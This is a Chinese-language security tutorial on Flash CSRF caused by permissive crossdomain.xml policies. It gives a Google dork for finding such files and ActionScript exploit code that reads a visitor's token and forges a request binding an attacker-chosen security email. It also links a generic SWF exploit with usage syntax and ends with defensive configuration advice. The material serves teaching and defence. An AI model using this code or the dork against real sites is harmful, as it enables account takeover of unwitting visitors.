# Flash CSRF

目录
--

* * *

```
0x00 Flash CSRF 名词解释
0x01 Flash CSRF形成的原因
0x02 Flash CSRF可以干些什么
0x03 Flash CSRF如何利用
0x04 Flash CSRF怎么防御

```

0x00 Flash CSRF名词解释
-------------------

* * *

CSRF（Cross-site request forgery跨站请求伪造，是一种对网站的恶意利用，CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。

Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。

0x01 Flash CSRF形成的原因
--------------------

* * *

So 官腔我们也打了，还是要干点实事PS：:)

为人民服务的好孩子，我们来看看如何寻找Flash CSRF:

首先我们要知道怎么形成CSRF的

PS:CSRF形成的原因大概有以下几种：

Flash跨域权限管理文件设置为允许所有主机/域名跨域对本站进行读写数据：

```
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<cross-domain-policy>
    <allow-access-from domain="*"/>
</cross-domain-policy>

```

Flash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF。

0x02 如何来发现哪些地方存在Flash CSRF
--------------------------

* * *

骚年们，前面我们介绍了形成Flash CSRF的原因，我们是不是就可以对站下药了，难道又有一波个人资料被莫名被修改成“狗皮膏药”广告的节奏啊，敬告各位看官，看见了这篇文章之后请检查自己的站是否存在Flash CSRF以免减少被举报而带来的巨额损失啊（吊丝们对各位看官望尘莫及啊）：

由上面我们得知Flash CSRF是因为跨域权限管理文件配置不当而产生的，所以我们可以在根目录打开Crossdomain.xml来查看该网站或者只域名是否存在FLAH的CSRF：

```
http://www.xxx.com/crossdomain.xml

```

  

```
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<cross-domain-policy>
<allow-access-from domain="*"/>
</cross-domain-policy>

```

0x02 Flash CSRF可以干些什么
---------------------

* * *

在一个月黑风高的夜晚，Flash CSRF慢慢的在向XX网靠近，下面说说我是怎么找到XX网的Flash CSRF和利用XX网的Flash CSRF直接修改访问者账号信息。

无聊的逛着各大新闻网站，感觉这些大部分新闻网站的新闻源都差不多没几下就看完了，最后觉得自己作为天朝一员还是应该关系关系下国家大事，就懵懂懂的打开了XX网，关心了下我国基本国情，始终耐不住寂寞，正好前两天学习了Flash CSRF的原理和危害，但是一直没找到东西练手，大家都知道天朝的网站是多么的牛B，但是也只是抱着试试的心态，完全就是小孩子玩玩泥巴而已了，玩笑时间到，回到正题:),我先打开xx网，按照刚刚前面查找该网站是否有Flash CSRF漏洞我们第一步该判断什么？没错就是看官们看到的这样，我也只是个凡人而已。。。。于是就有了如下的FlashCSRF漏洞查找流程：

```
Google hack:crossdomain filetype:xml

```

  

```
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<cross-domain-policy>
<allow-access-from domain="*" secure=”true”/>
</cross-domain-policy>

```

Secure=true的意思是只允许通过安全链接来请求本域的数据。

随手查看了发现前2个全都是需要用ssl证书加密了之后的网站里面的Flash的文件才能获取本域的内容，突然之间脑海就浮现了一种奇怪的想法，自己搭建SSL网站，然后调用Flash文件进去不就可以读他们网站的数据和发送post请求，可是又遇见瓶颈了，找了这么多地方我Flash还没有地方可以插的，在不屑努力下，找到BLOG根目录下面的CrossDomain.xml文件居然允许所有主机的Flash读取本域的数据-PS：），下面我们就试试BLOG页面,发现也有，当然耐心也是必须的。

0x03 Flash CSRF如何利用
-------------------

* * *

我们找一个可以插入Flash的地方，插入我们自己写的Flash，访客访问我们网页就会执行我们写的脚本，下面我们来看看Flash CSRF具体利用方法。 So~下面我们来制造一个访客访问我们链接的时候，自动设置自己的密保邮箱：

首先我们添加保密邮箱点提交，然后抓包分析它提交了什么内容，然后来构造我们的Flash CSRF利用代码,下面我们提交绑定保密邮箱请求，抓包分析它的数据。 申请保密邮箱，浏览器向服务端发送了一个POST请求，请求地址和参数为：

```
POST:xxx.xxx.xx/xx.jsp?userid=xxxx&mail=dddd@dddd.com

```

由于我们之前测试保密邮箱得知服务端没有验证Referer，但是页面验证了Token，所以我们就可以直接把POST数据包中的请求地址，参数名，参数值，Token值取出来用于伪造绑定保密邮箱的请求。

利用代码：

```
package {
    import flash.display.Sprite;
    import flash.events.Event;
    import flash.net.*;
    import flash.text.TextField;
    public class url extends Sprite
    {
        public function url()
        {
            //获取当前页面userid/token
            var echo_txt:TextField = new TextField();
            var targetURL:String = "http://xx.xx.cc";
            var request:URLRequest = new URLRequest(targetURL);
            request.method = URLRequestMethod.GET;
            request.data = "";
            sendToURL(request);
            var loader:URLLoader=new URLLoader();
            loader.addEventListener(Event.COMPLETE,completeHandler);
            function completeHandler(event:Event):void{
            var userid:String=((loader.data+"").match(/\/xxxx\/mxxxx\.php\?xxid=(\d+)/)||["",""])[1];

 var masthash:String=((loader.data+"").match(/\/xxxx\/mxxxx\.php\?masthash=(\d+)/)||["",""])[1];
            echo_txt.text =  masthash;
            //伪造申请密保邮箱POST请求
            var emailtargetURL:String = "http://xxxxxx.xx.cc/xxxx/xxxx.jsp?mark=send";
            var emailrequest:URLRequest = new URLRequest(emailtargetURL);
            emailrequest.method = URLRequestMethod.POST;
            var postdata:Object = new Array();
            postdata[0]="xxxx=xxxx@xxx.cc&xxxx="+xxxxx&"xxxxx="+xxx;
            emailrequest.data = postdata[0];
            sendToURL(emailrequest);
            }
            loader.load(request);
        }
    }
}

```

我们用一个新账号来做测试看看效果 ：）

0x04 Flash CSRF怎么防御
-------------------

* * *

知道Flash CSRF攻击流程，然后在防御就so easy了~:)

妈妈再也不担心我被Flash CSRF啦~虽然各位看官都明白了怎么防御，但是还是照例啰嗦一下啦：

一句话概括：站点根目录CrossDomain.xml跨域获取信息权限控制好，精确到子域，不给不法分子留下机会！！ 附一份自己网站的CrossDomain.xml文件权限配置：

```
<?xml version="1.0"?>
<cross-domain-policy>
  <allow-access-from domain="http://xx.xx.com" secure="true”/>
<allow-access-from domain="http://cc.xx.com" secure="true”/>
</cross-domain-policy>

```

根据自己的业务需求来更改CrossDomain.xml文件配置，切记精确到子域，这样会大大减少Flash CSRF的风险！

通用Flash CSRF EXP :[FlashCSRFexp.swf](http://static.wooyun.org/20141017/2014101716304958791.swf)

使用方法：

```
FlashCSRFexp.swf?url=http://www.xx.xx/x.jsp?&xx=xx&xx=xx&xx=xx&xx=xx
PS:url=[post请求的地址]&[参数值用&分开]

```

谢谢各位大牛捧场，十分感谢二哥，长短短，PKAV团队的技术栽培 :)~